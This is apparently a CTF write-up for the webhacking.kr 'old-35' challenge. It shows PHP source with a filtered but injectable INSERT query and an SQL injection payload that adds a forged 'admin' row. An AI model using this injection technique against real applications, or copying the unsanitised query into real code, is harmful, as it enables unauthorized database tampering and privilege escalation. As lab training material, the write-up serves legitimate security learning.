# Old 35    SQLi (Insert)

URL: [https://webhacking.kr/challenge/web-17/?view_source=1](https://webhacking.kr/challenge/web-17/?view_source=1)

![old-35.png](/assets/ctf/webhacking.kr/old-35.png)

```php
<?php
$db = dbconnect();
if ($_GET["phone"] && $_GET["id"]) {
    if (preg_match("/\*|\/|=|select|-|#|;/i", $_GET["phone"])) {
        exit("no hack");
    }
    if (strlen($_GET["id"]) > 5) {
        exit("no hack");
    }
    if (preg_match("/admin/i", $_GET["id"])) {
        exit("you are not admin");
    }
    mysqli_query(
        $db,
        "insert into chall35(id,ip,phone) values('{$_GET["id"]}','{$_SERVER["REMOTE_ADDR"]}',{$_GET["phone"]})"
    ) or die("query error");
    echo "Done<br>";
}

$isAdmin = mysqli_fetch_array(
    mysqli_query(
        $db,
        "select ip from chall35 where id='admin' and ip='{$_SERVER["REMOTE_ADDR"]}'"
    )
);
if ($isAdmin["ip"] == $_SERVER["REMOTE_ADDR"]) {
    solve(35);
    mysqli_query($db, "delete from chall35");
}

$phone_list = mysqli_query(
    $db,
    "select * from chall35 where ip='{$_SERVER["REMOTE_ADDR"]}'"
);
echo "<!--\n";
while ($r = mysqli_fetch_array($phone_list)) {
    echo htmlentities($r["id"]) . " - " . $r["phone"] . "\n";
}
echo "-->\n";
?>
```

To solve the challenge we need to be `admin`, but `id` is restricted from being admin and it's size is also limited to 5. `phone` also has restrictions, from what it seems mostly comments. 

We are not restricted to adding new values into insert:
```sql
INSERT INTO table(col1, col2) VALUES (val1, val2) 
->
INSERT INTO table(col1, col2) VALUES (val1, val2 <),(injected_val1, injected_val2> ) 
```

> Note: Injection point surrounded with `<>` for visuals.

Payload:
```sql
1),('admin', 'YOUR_IP', 1
```

![old-35-1.png](/assets/ctf/webhacking.kr/old-35-1.png)